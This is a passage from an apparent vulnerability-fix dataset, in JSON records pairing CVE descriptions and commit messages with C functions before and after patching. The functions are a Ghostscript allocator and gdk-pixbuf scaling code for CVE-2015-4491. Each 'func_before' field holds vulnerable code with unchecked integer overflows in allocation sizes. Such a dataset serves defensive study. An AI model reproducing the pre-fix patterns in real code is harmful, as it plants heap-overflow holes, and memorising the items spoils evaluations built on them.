        "func_before": "static byte *\ngs_heap_alloc_bytes(gs_memory_t * mem, uint size, client_name_t cname)\n{\n    gs_malloc_memory_t *mmem = (gs_malloc_memory_t *) mem;\n    byte *ptr = 0;\n\n#ifdef DEBUG\n    const char *msg;\n    static const char *const ok_msg = \"OK\";\n\n#  define set_msg(str) (msg = (str))\n#else\n#  define set_msg(str) DO_NOTHING\n#endif\n\n        /* Exclusive acces so our decisions and changes are 'atomic' */\n    if (mmem->monitor)\n        gx_monitor_enter(mmem->monitor);\n    if (size > mmem->limit - sizeof(gs_malloc_block_t)) {\n        /* Definitely too large to allocate; also avoids overflow. */\n        set_msg(\"exceeded limit\");\n    } else {\n        uint added = size + sizeof(gs_malloc_block_t);\n\n        if (mmem->limit - added < mmem->used)\n            set_msg(\"exceeded limit\");\n        else if ((ptr = (byte *) Memento_label(malloc(added), cname)) == 0)\n            set_msg(\"failed\");\n        else {\n            gs_malloc_block_t *bp = (gs_malloc_block_t *) ptr;\n\n            /*\n             * We would like to check that malloc aligns blocks at least as\n             * strictly as the compiler (as defined by ARCH_ALIGN_MEMORY_MOD).\n             * However, Microsoft VC 6 does not satisfy this requirement.\n             * See gsmemory.h for more explanation.\n             */\n            set_msg(ok_msg);\n            if (mmem->allocated)\n                mmem->allocated->prev = bp;\n            bp->next = mmem->allocated;\n            bp->prev = 0;\n            bp->size = size;\n            bp->type = &st_bytes;\n            bp->cname = cname;\n            mmem->allocated = bp;\n            ptr = (byte *) (bp + 1);\n            mmem->used += size + sizeof(gs_malloc_block_t);\n            if (mmem->used > mmem->max_used)\n                mmem->max_used = mmem->used;\n        }\n    }\n    if (mmem->monitor)\n        gx_monitor_leave(mmem->monitor);\t/* Done with exclusive access */\n    /* We don't want to 'fill' under mutex to keep the window smaller */\n    if (ptr)\n        gs_alloc_fill(ptr, gs_alloc_fill_alloc, size);\n#ifdef DEBUG\n    if (gs_debug_c('a') || msg != ok_msg)\n        dmlprintf6(mem, \"[a+]gs_malloc(%s)(%u) = 0x%lx: %s, used=%ld, max=%ld\\n\",\n                   client_name_string(cname), size, (ulong) ptr, msg, mmem->used, mmem->max_used);\n#endif\n    return ptr;\n#undef set_msg\n}",
        "func": "static byte *\ngs_heap_alloc_bytes(gs_memory_t * mem, uint size, client_name_t cname)\n{\n    gs_malloc_memory_t *mmem = (gs_malloc_memory_t *) mem;\n    byte *ptr = 0;\n\n#ifdef DEBUG\n    const char *msg;\n    static const char *const ok_msg = \"OK\";\n\n#  define set_msg(str) (msg = (str))\n#else\n#  define set_msg(str) DO_NOTHING\n#endif\n\n        /* Exclusive acces so our decisions and changes are 'atomic' */\n    if (mmem->monitor)\n        gx_monitor_enter(mmem->monitor);\n    if (size > mmem->limit - sizeof(gs_malloc_block_t)) {\n        /* Definitely too large to allocate; also avoids overflow. */\n        set_msg(\"exceeded limit\");\n    } else {\n        uint added = size + sizeof(gs_malloc_block_t);\n\n        if (added <= size || mmem->limit - added < mmem->used)\n            set_msg(\"exceeded limit\");\n        else if ((ptr = (byte *) Memento_label(malloc(added), cname)) == 0)\n            set_msg(\"failed\");\n        else {\n            gs_malloc_block_t *bp = (gs_malloc_block_t *) ptr;\n\n            /*\n             * We would like to check that malloc aligns blocks at least as\n             * strictly as the compiler (as defined by ARCH_ALIGN_MEMORY_MOD).\n             * However, Microsoft VC 6 does not satisfy this requirement.\n             * See gsmemory.h for more explanation.\n             */\n            set_msg(ok_msg);\n            if (mmem->allocated)\n                mmem->allocated->prev = bp;\n            bp->next = mmem->allocated;\n            bp->prev = 0;\n            bp->size = size;\n            bp->type = &st_bytes;\n            bp->cname = cname;\n            mmem->allocated = bp;\n            ptr = (byte *) (bp + 1);\n            mmem->used += size + sizeof(gs_malloc_block_t);\n            if (mmem->used > mmem->max_used)\n                mmem->max_used = mmem->used;\n        }\n    }\n    if (mmem->monitor)\n        gx_monitor_leave(mmem->monitor);\t/* Done with exclusive access */\n    /* We don't want to 'fill' under mutex to keep the window smaller */\n    if (ptr)\n        gs_alloc_fill(ptr, gs_alloc_fill_alloc, size);\n#ifdef DEBUG\n    if (gs_debug_c('a') || msg != ok_msg)\n        dmlprintf6(mem, \"[a+]gs_malloc(%s)(%u) = 0x%lx: %s, used=%ld, max=%ld\\n\",\n                   client_name_string(cname), size, (ulong) ptr, msg, mmem->used, mmem->max_used);\n#endif\n    return ptr;\n#undef set_msg\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -22,7 +22,7 @@\n     } else {\n         uint added = size + sizeof(gs_malloc_block_t);\n \n-        if (mmem->limit - added < mmem->used)\n+        if (added <= size || mmem->limit - added < mmem->used)\n             set_msg(\"exceeded limit\");\n         else if ((ptr = (byte *) Memento_label(malloc(added), cname)) == 0)\n             set_msg(\"failed\");",
        "diff_line_info": {
            "deleted_lines": [
                "        if (mmem->limit - added < mmem->used)"
            ],
            "added_lines": [
                "        if (added <= size || mmem->limit - added < mmem->used)"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4491",
        "func_name": "GNOME/gdk-pixbuf/make_filter_table",
        "description": "Integer overflow in the make_filter_table function in pixops/pixops.c in gdk-pixbuf before 2.31.5, as used in Mozilla Firefox before 40.0 and Firefox ESR 38.x before 38.2 on Linux, Google Chrome on Linux, and other products, allows remote attackers to execute arbitrary code or cause a denial of service (heap-based buffer overflow and application crash) via crafted bitmap dimensions that are mishandled during scaling.",
        "git_url": "https://github.com/GNOME/gdk-pixbuf/commit/8dba67cb4f38d62a47757741ad41e3f245b4a32a",
        "commit_title": "pixops: Fix oversight for CVE-2015-4491",
        "commit_text": " The n_x variable could be made large enough to overflow, too.  Also included are various testcases for this vulnerability: - The original exploit (adapted for the testsuite) - Causing overflow by making both X and Y variables large - Causing overflow using only the X variable - Causing overflow using only the Y variable  https://bugzilla.gnome.org/show_bug.cgi?id=752297",
        "func_before": "static int *\nmake_filter_table (PixopsFilter *filter)\n{\n  int i_offset, j_offset;\n  int n_x = filter->x.n;\n  int n_y = filter->y.n;\n  gsize n_weights;\n  int *weights;\n\n  n_weights = SUBSAMPLE * SUBSAMPLE * n_x * n_y;\n  if (n_weights / (SUBSAMPLE * SUBSAMPLE * n_x) != n_y)\n    return NULL; /* overflow, bail */\n\n  weights = g_try_new (int, n_weights);\n  if (!weights)\n    return NULL; /* overflow, bail */\n\n  for (i_offset=0; i_offset < SUBSAMPLE; i_offset++)\n    for (j_offset=0; j_offset < SUBSAMPLE; j_offset++)\n      {\n        double weight;\n        int *pixel_weights = weights + ((i_offset*SUBSAMPLE) + j_offset) * n_x * n_y;\n        int total = 0;\n        int i, j;\n\n        for (i=0; i < n_y; i++)\n          for (j=0; j < n_x; j++)\n            {\n              weight = filter->x.weights[(j_offset * n_x) + j] *\n                       filter->y.weights[(i_offset * n_y) + i] *\n                       filter->overall_alpha * 65536 + 0.5;\n\n              total += (int)weight;\n\n              *(pixel_weights + n_x * i + j) = weight;\n            }\n\n        correct_total (pixel_weights, n_x, n_y, total, filter->overall_alpha);\n      }\n\n  return weights;\n}",
        "func": "static int *\nmake_filter_table (PixopsFilter *filter)\n{\n  int i_offset, j_offset;\n  int n_x = filter->x.n;\n  int n_y = filter->y.n;\n  gsize n_weights;\n  int *weights;\n\n  n_weights = SUBSAMPLE * SUBSAMPLE * n_x;\n  if (n_weights / (SUBSAMPLE * SUBSAMPLE) != n_x)\n    return NULL; /* overflow, bail */\n\n  n_weights *= n_y;\n  if (n_weights / (SUBSAMPLE * SUBSAMPLE * n_x) != n_y)\n    return NULL; /* overflow, bail */\n\n  weights = g_try_new (int, n_weights);\n  if (!weights)\n    return NULL; /* overflow, bail */\n\n  for (i_offset=0; i_offset < SUBSAMPLE; i_offset++)\n    for (j_offset=0; j_offset < SUBSAMPLE; j_offset++)\n      {\n        double weight;\n        int *pixel_weights = weights + ((i_offset*SUBSAMPLE) + j_offset) * n_x * n_y;\n        int total = 0;\n        int i, j;\n\n        for (i=0; i < n_y; i++)\n          for (j=0; j < n_x; j++)\n            {\n              weight = filter->x.weights[(j_offset * n_x) + j] *\n                       filter->y.weights[(i_offset * n_y) + i] *\n                       filter->overall_alpha * 65536 + 0.5;\n\n              total += (int)weight;\n\n              *(pixel_weights + n_x * i + j) = weight;\n            }\n\n        correct_total (pixel_weights, n_x, n_y, total, filter->overall_alpha);\n      }\n\n  return weights;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -7,7 +7,11 @@\n   gsize n_weights;\n   int *weights;\n \n-  n_weights = SUBSAMPLE * SUBSAMPLE * n_x * n_y;\n+  n_weights = SUBSAMPLE * SUBSAMPLE * n_x;\n+  if (n_weights / (SUBSAMPLE * SUBSAMPLE) != n_x)\n+    return NULL; /* overflow, bail */\n+\n+  n_weights *= n_y;\n   if (n_weights / (SUBSAMPLE * SUBSAMPLE * n_x) != n_y)\n     return NULL; /* overflow, bail */\n ",
        "diff_line_info": {
            "deleted_lines": [
                "  n_weights = SUBSAMPLE * SUBSAMPLE * n_x * n_y;"
            ],
            "added_lines": [
                "  n_weights = SUBSAMPLE * SUBSAMPLE * n_x;",
                "  if (n_weights / (SUBSAMPLE * SUBSAMPLE) != n_x)",
                "    return NULL; /* overflow, bail */",
                "",
                "  n_weights *= n_y;"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4491",
        "func_name": "GNOME/gdk-pixbuf/make_filter_table",
        "description": "Integer overflow in the make_filter_table function in pixops/pixops.c in gdk-pixbuf before 2.31.5, as used in Mozilla Firefox before 40.0 and Firefox ESR 38.x before 38.2 on Linux, Google Chrome on Linux, and other products, allows remote attackers to execute arbitrary code or cause a denial of service (heap-based buffer overflow and application crash) via crafted bitmap dimensions that are mishandled during scaling.",
        "git_url": "https://github.com/GNOME/gdk-pixbuf/commit/ffec86ed5010c5a2be14f47b33bcf4ed3169a199",
        "commit_title": "pixops: Be more careful about integer overflow",
        "commit_text": " Our loader code is supposed to handle out-of-memory and overflow situations gracefully, reporting errors instead of aborting. But if you load an image at a specific size, we also execute our scaling code, which was not careful enough about overflow in some places.  This commit makes the scaling code silently return if it fails to allocate filter tables. This is the best we can do, since gdk_pixbuf_scale() is not taking a GError.  https://bugzilla.gnome.org/show_bug.cgi?id=752297",
        "func_before": "static int *\nmake_filter_table (PixopsFilter *filter)\n{\n  int i_offset, j_offset;\n  int n_x = filter->x.n;\n  int n_y = filter->y.n;\n  int *weights = g_new (int, SUBSAMPLE * SUBSAMPLE * n_x * n_y);\n\n  for (i_offset=0; i_offset < SUBSAMPLE; i_offset++)\n    for (j_offset=0; j_offset < SUBSAMPLE; j_offset++)\n      {\n        double weight;\n        int *pixel_weights = weights + ((i_offset*SUBSAMPLE) + j_offset) * n_x * n_y;\n        int total = 0;\n        int i, j;\n\n        for (i=0; i < n_y; i++)\n          for (j=0; j < n_x; j++)\n            {\n              weight = filter->x.weights[(j_offset * n_x) + j] *\n                       filter->y.weights[(i_offset * n_y) + i] *\n                       filter->overall_alpha * 65536 + 0.5;\n\n              total += (int)weight;\n\n              *(pixel_weights + n_x * i + j) = weight;\n            }\n\n        correct_total (pixel_weights, n_x, n_y, total, filter->overall_alpha);\n      }\n\n  return weights;\n}",
        "func": "static int *\nmake_filter_table (PixopsFilter *filter)\n{\n  int i_offset, j_offset;\n  int n_x = filter->x.n;\n  int n_y = filter->y.n;\n  gsize n_weights;\n  int *weights;\n\n  n_weights = SUBSAMPLE * SUBSAMPLE * n_x * n_y;\n  if (n_weights / (SUBSAMPLE * SUBSAMPLE * n_x) != n_y)\n    return NULL; /* overflow, bail */\n\n  weights = g_try_new (int, n_weights);\n  if (!weights)\n    return NULL; /* overflow, bail */\n\n  for (i_offset=0; i_offset < SUBSAMPLE; i_offset++)\n    for (j_offset=0; j_offset < SUBSAMPLE; j_offset++)\n      {\n        double weight;\n        int *pixel_weights = weights + ((i_offset*SUBSAMPLE) + j_offset) * n_x * n_y;\n        int total = 0;\n        int i, j;\n\n        for (i=0; i < n_y; i++)\n          for (j=0; j < n_x; j++)\n            {\n              weight = filter->x.weights[(j_offset * n_x) + j] *\n                       filter->y.weights[(i_offset * n_y) + i] *\n                       filter->overall_alpha * 65536 + 0.5;\n\n              total += (int)weight;\n\n              *(pixel_weights + n_x * i + j) = weight;\n            }\n\n        correct_total (pixel_weights, n_x, n_y, total, filter->overall_alpha);\n      }\n\n  return weights;\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -4,7 +4,16 @@\n   int i_offset, j_offset;\n   int n_x = filter->x.n;\n   int n_y = filter->y.n;\n-  int *weights = g_new (int, SUBSAMPLE * SUBSAMPLE * n_x * n_y);\n+  gsize n_weights;\n+  int *weights;\n+\n+  n_weights = SUBSAMPLE * SUBSAMPLE * n_x * n_y;\n+  if (n_weights / (SUBSAMPLE * SUBSAMPLE * n_x) != n_y)\n+    return NULL; /* overflow, bail */\n+\n+  weights = g_try_new (int, n_weights);\n+  if (!weights)\n+    return NULL; /* overflow, bail */\n \n   for (i_offset=0; i_offset < SUBSAMPLE; i_offset++)\n     for (j_offset=0; j_offset < SUBSAMPLE; j_offset++)",
        "diff_line_info": {
            "deleted_lines": [
                "  int *weights = g_new (int, SUBSAMPLE * SUBSAMPLE * n_x * n_y);"
            ],
            "added_lines": [
                "  gsize n_weights;",
                "  int *weights;",
                "",
                "  n_weights = SUBSAMPLE * SUBSAMPLE * n_x * n_y;",
                "  if (n_weights / (SUBSAMPLE * SUBSAMPLE * n_x) != n_y)",
                "    return NULL; /* overflow, bail */",
                "",
                "  weights = g_try_new (int, n_weights);",
                "  if (!weights)",
                "    return NULL; /* overflow, bail */"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4491",
        "func_name": "GNOME/gdk-pixbuf/tile_make_weights",
        "description": "Integer overflow in the make_filter_table function in pixops/pixops.c in gdk-pixbuf before 2.31.5, as used in Mozilla Firefox before 40.0 and Firefox ESR 38.x before 38.2 on Linux, Google Chrome on Linux, and other products, allows remote attackers to execute arbitrary code or cause a denial of service (heap-based buffer overflow and application crash) via crafted bitmap dimensions that are mishandled during scaling.",
        "git_url": "https://github.com/GNOME/gdk-pixbuf/commit/ffec86ed5010c5a2be14f47b33bcf4ed3169a199",
        "commit_title": "pixops: Be more careful about integer overflow",
        "commit_text": " Our loader code is supposed to handle out-of-memory and overflow situations gracefully, reporting errors instead of aborting. But if you load an image at a specific size, we also execute our scaling code, which was not careful enough about overflow in some places.  This commit makes the scaling code silently return if it fails to allocate filter tables. This is the best we can do, since gdk_pixbuf_scale() is not taking a GError.  https://bugzilla.gnome.org/show_bug.cgi?id=752297",
        "func_before": "static void\ntile_make_weights (PixopsFilterDimension *dim,\n\t\t   double                 scale)\n{\n  int n = ceil (1 / scale + 1);\n  double *pixel_weights = g_new (double, SUBSAMPLE * n);\n  int offset;\n  int i;\n\n  dim->n = n;\n  dim->offset = 0;\n  dim->weights = pixel_weights;\n\n  for (offset = 0; offset < SUBSAMPLE; offset++)\n    {\n      double x = (double)offset / SUBSAMPLE;\n      double a = x + 1 / scale;\n\n      for (i = 0; i < n; i++)\n        {\n          if (i < x)\n            {\n              if (i + 1 > x)\n                *(pixel_weights++)  = (MIN (i + 1, a) - x) * scale;\n              else\n                *(pixel_weights++) = 0;\n            }\n          else\n            {\n              if (a > i)\n                *(pixel_weights++)  = (MIN (i + 1, a) - i) * scale;\n              else\n                *(pixel_weights++) = 0;\n            }\n       }\n    }\n}",
        "func": "static void\ntile_make_weights (PixopsFilterDimension *dim,\n\t\t   double                 scale)\n{\n  int n = ceil (1 / scale + 1);\n  double *pixel_weights = g_malloc_n (sizeof (double) * SUBSAMPLE, n);\n  int offset;\n  int i;\n\n  dim->n = n;\n  dim->offset = 0;\n  dim->weights = pixel_weights;\n\n  for (offset = 0; offset < SUBSAMPLE; offset++)\n    {\n      double x = (double)offset / SUBSAMPLE;\n      double a = x + 1 / scale;\n\n      for (i = 0; i < n; i++)\n        {\n          if (i < x)\n            {\n              if (i + 1 > x)\n                *(pixel_weights++)  = (MIN (i + 1, a) - x) * scale;\n              else\n                *(pixel_weights++) = 0;\n            }\n          else\n            {\n              if (a > i)\n                *(pixel_weights++)  = (MIN (i + 1, a) - i) * scale;\n              else\n                *(pixel_weights++) = 0;\n            }\n       }\n    }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -3,7 +3,7 @@\n \t\t   double                 scale)\n {\n   int n = ceil (1 / scale + 1);\n-  double *pixel_weights = g_new (double, SUBSAMPLE * n);\n+  double *pixel_weights = g_malloc_n (sizeof (double) * SUBSAMPLE, n);\n   int offset;\n   int i;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "  double *pixel_weights = g_new (double, SUBSAMPLE * n);"
            ],
            "added_lines": [
                "  double *pixel_weights = g_malloc_n (sizeof (double) * SUBSAMPLE, n);"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4491",
        "func_name": "GNOME/gdk-pixbuf/bilinear_box_make_weights",
        "description": "Integer overflow in the make_filter_table function in pixops/pixops.c in gdk-pixbuf before 2.31.5, as used in Mozilla Firefox before 40.0 and Firefox ESR 38.x before 38.2 on Linux, Google Chrome on Linux, and other products, allows remote attackers to execute arbitrary code or cause a denial of service (heap-based buffer overflow and application crash) via crafted bitmap dimensions that are mishandled during scaling.",
        "git_url": "https://github.com/GNOME/gdk-pixbuf/commit/ffec86ed5010c5a2be14f47b33bcf4ed3169a199",
        "commit_title": "pixops: Be more careful about integer overflow",
        "commit_text": " Our loader code is supposed to handle out-of-memory and overflow situations gracefully, reporting errors instead of aborting. But if you load an image at a specific size, we also execute our scaling code, which was not careful enough about overflow in some places.  This commit makes the scaling code silently return if it fails to allocate filter tables. This is the best we can do, since gdk_pixbuf_scale() is not taking a GError.  https://bugzilla.gnome.org/show_bug.cgi?id=752297",
        "func_before": "static void\nbilinear_box_make_weights (PixopsFilterDimension *dim,\n\t\t\t   double                 scale)\n{\n  int n = ceil (1/scale + 3.0);\n  double *pixel_weights = g_new (double, SUBSAMPLE * n);\n  double w;\n  int offset, i;\n\n  dim->offset = -1.0;\n  dim->n = n;\n  dim->weights = pixel_weights;\n\n  for (offset = 0; offset < SUBSAMPLE; offset++)\n    {\n      double x = (double)offset / SUBSAMPLE;\n      double a = x + 1 / scale;\n\n      for (i = 0; i < n; i++)\n        {\n          w  = linear_box_half (0.5 + i - a, 0.5 + i - x);\n          w += linear_box_half (1.5 + x - i, 1.5 + a - i);\n      \n          *(pixel_weights++) = w * scale;\n        }\n    }\n}",
        "func": "static void\nbilinear_box_make_weights (PixopsFilterDimension *dim,\n\t\t\t   double                 scale)\n{\n  int n = ceil (1/scale + 3.0);\n  double *pixel_weights = g_malloc_n (sizeof (double) * SUBSAMPLE, n);\n  double w;\n  int offset, i;\n\n  dim->offset = -1.0;\n  dim->n = n;\n  dim->weights = pixel_weights;\n\n  for (offset = 0; offset < SUBSAMPLE; offset++)\n    {\n      double x = (double)offset / SUBSAMPLE;\n      double a = x + 1 / scale;\n\n      for (i = 0; i < n; i++)\n        {\n          w  = linear_box_half (0.5 + i - a, 0.5 + i - x);\n          w += linear_box_half (1.5 + x - i, 1.5 + a - i);\n      \n          *(pixel_weights++) = w * scale;\n        }\n    }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -3,7 +3,7 @@\n \t\t\t   double                 scale)\n {\n   int n = ceil (1/scale + 3.0);\n-  double *pixel_weights = g_new (double, SUBSAMPLE * n);\n+  double *pixel_weights = g_malloc_n (sizeof (double) * SUBSAMPLE, n);\n   double w;\n   int offset, i;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "  double *pixel_weights = g_new (double, SUBSAMPLE * n);"
            ],
            "added_lines": [
                "  double *pixel_weights = g_malloc_n (sizeof (double) * SUBSAMPLE, n);"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4491",
        "func_name": "GNOME/gdk-pixbuf/bilinear_magnify_make_weights",
        "description": "Integer overflow in the make_filter_table function in pixops/pixops.c in gdk-pixbuf before 2.31.5, as used in Mozilla Firefox before 40.0 and Firefox ESR 38.x before 38.2 on Linux, Google Chrome on Linux, and other products, allows remote attackers to execute arbitrary code or cause a denial of service (heap-based buffer overflow and application crash) via crafted bitmap dimensions that are mishandled during scaling.",
        "git_url": "https://github.com/GNOME/gdk-pixbuf/commit/ffec86ed5010c5a2be14f47b33bcf4ed3169a199",
        "commit_title": "pixops: Be more careful about integer overflow",
        "commit_text": " Our loader code is supposed to handle out-of-memory and overflow situations gracefully, reporting errors instead of aborting. But if you load an image at a specific size, we also execute our scaling code, which was not careful enough about overflow in some places.  This commit makes the scaling code silently return if it fails to allocate filter tables. This is the best we can do, since gdk_pixbuf_scale() is not taking a GError.  https://bugzilla.gnome.org/show_bug.cgi?id=752297",
        "func_before": "static void\nbilinear_magnify_make_weights (PixopsFilterDimension *dim,\n\t\t\t       double                 scale)\n{\n  double *pixel_weights;\n  int n;\n  int offset;\n  int i;\n\n  if (scale > 1.0)            /* Linear */\n    {\n      n = 2;\n      dim->offset = 0.5 * (1 / scale - 1);\n    }\n  else                          /* Tile */\n    {\n      n = ceil (1.0 + 1.0 / scale);\n      dim->offset = 0.0;\n    }\n\n  dim->n = n;\n  dim->weights = g_new (double, SUBSAMPLE * n);\n\n  pixel_weights = dim->weights;\n\n  for (offset=0; offset < SUBSAMPLE; offset++)\n    {\n      double x = (double)offset / SUBSAMPLE;\n\n      if (scale > 1.0)      /* Linear */\n        {\n          for (i = 0; i < n; i++)\n            *(pixel_weights++) = (((i == 0) ? (1 - x) : x) / scale) * scale;\n        }\n      else                  /* Tile */\n        {\n          double a = x + 1 / scale;\n\n          /*           x\n           * ---------|--.-|----|--.-|-------  SRC\n           * ------------|---------|---------  DEST\n           */\n          for (i = 0; i < n; i++)\n            {\n              if (i < x)\n                {\n                  if (i + 1 > x)\n                    *(pixel_weights++) = (MIN (i + 1, a) - x) * scale;\n                  else\n                    *(pixel_weights++) = 0;\n                }\n              else\n                {\n                  if (a > i)\n                    *(pixel_weights++) = (MIN (i + 1, a) - i) * scale;\n                  else\n                    *(pixel_weights++) = 0;\n                }\n            }\n        }\n    }\n}",
        "func": "static void\nbilinear_magnify_make_weights (PixopsFilterDimension *dim,\n\t\t\t       double                 scale)\n{\n  double *pixel_weights;\n  int n;\n  int offset;\n  int i;\n\n  if (scale > 1.0)            /* Linear */\n    {\n      n = 2;\n      dim->offset = 0.5 * (1 / scale - 1);\n    }\n  else                          /* Tile */\n    {\n      n = ceil (1.0 + 1.0 / scale);\n      dim->offset = 0.0;\n    }\n\n  dim->n = n;\n  dim->weights = g_malloc_n (sizeof (double) * SUBSAMPLE, n);\n\n  pixel_weights = dim->weights;\n\n  for (offset=0; offset < SUBSAMPLE; offset++)\n    {\n      double x = (double)offset / SUBSAMPLE;\n\n      if (scale > 1.0)      /* Linear */\n        {\n          for (i = 0; i < n; i++)\n            *(pixel_weights++) = (((i == 0) ? (1 - x) : x) / scale) * scale;\n        }\n      else                  /* Tile */\n        {\n          double a = x + 1 / scale;\n\n          /*           x\n           * ---------|--.-|----|--.-|-------  SRC\n           * ------------|---------|---------  DEST\n           */\n          for (i = 0; i < n; i++)\n            {\n              if (i < x)\n                {\n                  if (i + 1 > x)\n                    *(pixel_weights++) = (MIN (i + 1, a) - x) * scale;\n                  else\n                    *(pixel_weights++) = 0;\n                }\n              else\n                {\n                  if (a > i)\n                    *(pixel_weights++) = (MIN (i + 1, a) - i) * scale;\n                  else\n                    *(pixel_weights++) = 0;\n                }\n            }\n        }\n    }\n}",
        "diff_func": "--- func_before\n+++ func_after\n@@ -19,7 +19,7 @@\n     }\n \n   dim->n = n;\n-  dim->weights = g_new (double, SUBSAMPLE * n);\n+  dim->weights = g_malloc_n (sizeof (double) * SUBSAMPLE, n);\n \n   pixel_weights = dim->weights;\n ",
        "diff_line_info": {
            "deleted_lines": [
                "  dim->weights = g_new (double, SUBSAMPLE * n);"
            ],
            "added_lines": [
                "  dim->weights = g_malloc_n (sizeof (double) * SUBSAMPLE, n);"
            ]
        }
    },
    {
        "cve_id": "CVE-2015-4491",
        "func_name": "GNOME/gdk-pixbuf/pixops_process",
        "description": "Integer overflow in the make_filter_table function in pixops/pixops.c in gdk-pixbuf before 2.31.5, as used in Mozilla Firefox before 40.0 and Firefox ESR 38.x before 38.2 on Linux, Google Chrome on Linux, and other products, allows remote attackers to execute arbitrary code or cause a denial of service (heap-based buffer overflow and application crash) via crafted bitmap dimensions that are mishandled during scaling.",
        "git_url": "https://github.com/GNOME/gdk-pixbuf/commit/ffec86ed5010c5a2be14f47b33bcf4ed3169a199",
        "commit_title": "pixops: Be more careful about integer overflow",
        "commit_text": " Our loader code is supposed to handle out-of-memory and overflow situations gracefully, reporting errors instead of aborting. But if you load an image at a specific size, we also execute our scaling code, which was not careful enough about overflow in some places.  This commit makes the scaling code silently return if it fails to allocate filter tables. This is the best we can do, since gdk_pixbuf_scale() is not taking a GError.  https://bugzilla.gnome.org/show_bug.cgi?id=752297",
        "func_before": "static void\npixops_process (guchar         *dest_buf,\n\t\tint             render_x0,\n\t\tint             render_y0,\n\t\tint             render_x1,\n\t\tint             render_y1,\n\t\tint             dest_rowstride,\n\t\tint             dest_channels,\n\t\tgboolean        dest_has_alpha,\n\t\tconst guchar   *src_buf,\n\t\tint             src_width,\n\t\tint             src_height,\n\t\tint             src_rowstride,\n\t\tint             src_channels,\n\t\tgboolean        src_has_alpha,\n\t\tdouble          scale_x,\n\t\tdouble          scale_y,\n\t\tint             check_x,\n\t\tint             check_y,\n\t\tint             check_size,\n\t\tguint32         color1,\n\t\tguint32         color2,\n\t\tPixopsFilter   *filter,\n\t\tPixopsLineFunc  line_func,\n\t\tPixopsPixelFunc pixel_func)\n{\n  int i, j;\n  int x, y;\t\t\t/* X and Y position in source (fixed_point) */\n\n  guchar **line_bufs;\n  int *filter_weights;\n\n  int x_step;\n  int y_step;\n\n  int check_shift;\n  int scaled_x_offset;\n\n  int run_end_x;\n  int run_end_index;\n\n  x_step = (1 << SCALE_SHIFT) / scale_x; /* X step in source (fixed point) */\n  y_step = (1 << SCALE_SHIFT) / scale_y; /* Y step in source (fixed point) */\n\n  if (x_step == 0 || y_step == 0)\n    return; /* overflow, bail out */\n\n  line_bufs = g_new (guchar *, filter->y.n);\n  filter_weights = make_filter_table (filter);\n\n  check_shift = check_size ? get_check_shift (check_size) : 0;\n\n  scaled_x_offset = floor (filter->x.offset * (1 << SCALE_SHIFT));\n\n  /* Compute the index where we run off the end of the source buffer. The\n   * furthest source pixel we access at index i is:\n   *\n   *  ((render_x0 + i) * x_step + scaled_x_offset) >> SCALE_SHIFT + filter->x.n - 1\n   *\n   * So, run_end_index is the smallest i for which this pixel is src_width,\n   * i.e, for which:\n   *\n   *  (i + render_x0) * x_step >= ((src_width - filter->x.n + 1) << SCALE_SHIFT) - scaled_x_offset\n   *\n   */\n#define MYDIV(a,b) ((a) > 0 ? (a) / (b) : ((a) - (b) + 1) / (b))    /* Division so that -1/5 = -1 */\n\n  run_end_x = (((src_width - filter->x.n + 1) << SCALE_SHIFT) - scaled_x_offset);\n  run_end_index = MYDIV (run_end_x + x_step - 1, x_step) - render_x0;\n  run_end_index = MIN (run_end_index, render_x1 - render_x0);\n\n  y = render_y0 * y_step + floor (filter->y.offset * (1 << SCALE_SHIFT));\n  for (i = 0; i < (render_y1 - render_y0); i++)\n    {\n      int dest_x;\n      int y_start = y >> SCALE_SHIFT;\n      int x_start;\n      int *run_weights = filter_weights +\n                         ((y >> (SCALE_SHIFT - SUBSAMPLE_BITS)) & SUBSAMPLE_MASK) *\n                         filter->x.n * filter->y.n * SUBSAMPLE;\n      guchar *new_outbuf;\n      guint32 tcolor1, tcolor2;\n\n      guchar *outbuf = dest_buf + dest_rowstride * i;\n      guchar *outbuf_end = outbuf + dest_channels * (render_x1 - render_x0);\n\n      if (((i + check_y) >> check_shift) & 1)\n\t{\n\t  tcolor1 = color2;\n\t  tcolor2 = color1;\n\t}\n      else\n\t{\n\t  tcolor1 = color1;\n\t  tcolor2 = color2;\n\t}\n\n      for (j=0; j<filter->y.n; j++)\n\t{\n\t  if (y_start <  0)\n\t    line_bufs[j] = (guchar *)src_buf;\n\t  else if (y_start < src_height)\n\t    line_bufs[j] = (guchar *)src_buf + src_rowstride * y_start;\n\t  else\n\t    line_bufs[j] = (guchar *)src_buf + src_rowstride * (src_height - 1);\n\n\t  y_start++;\n\t}\n\n      dest_x = check_x;\n      x = render_x0 * x_step + scaled_x_offset;\n      x_start = x >> SCALE_SHIFT;\n\n      while (x_start < 0 && outbuf < outbuf_end)\n\t{\n\t  process_pixel (run_weights + ((x >> (SCALE_SHIFT - SUBSAMPLE_BITS)) & SUBSAMPLE_MASK) * (filter->x.n * filter->y.n), filter->x.n, filter->y.n,\n\t\t\t outbuf, dest_x, dest_channels, dest_has_alpha,\n\t\t\t line_bufs, src_channels, src_has_alpha,\n\t\t\t x >> SCALE_SHIFT, src_width,\n\t\t\t check_size, tcolor1, tcolor2, pixel_func);\n\n\t  x += x_step;\n\t  x_start = x >> SCALE_SHIFT;\n\t  dest_x++;\n\t  outbuf += dest_channels;\n\t}\n\n      new_outbuf = (*line_func) (run_weights, filter->x.n, filter->y.n,\n\t\t\t\t outbuf, dest_x, dest_buf + dest_rowstride *\n\t\t\t\t i + run_end_index * dest_channels,\n\t\t\t\t dest_channels, dest_has_alpha,\n\t\t\t\t line_bufs, src_channels, src_has_alpha,\n\t\t\t\t x, x_step, src_width, check_size, tcolor1,\n\t\t\t\t tcolor2);\n\n      dest_x += (new_outbuf - outbuf) / dest_channels;\n\n      x = (dest_x - check_x + render_x0) * x_step + scaled_x_offset;\n      outbuf = new_outbuf;\n\n      while (outbuf < outbuf_end)\n\t{\n\t  process_pixel (run_weights + ((x >> 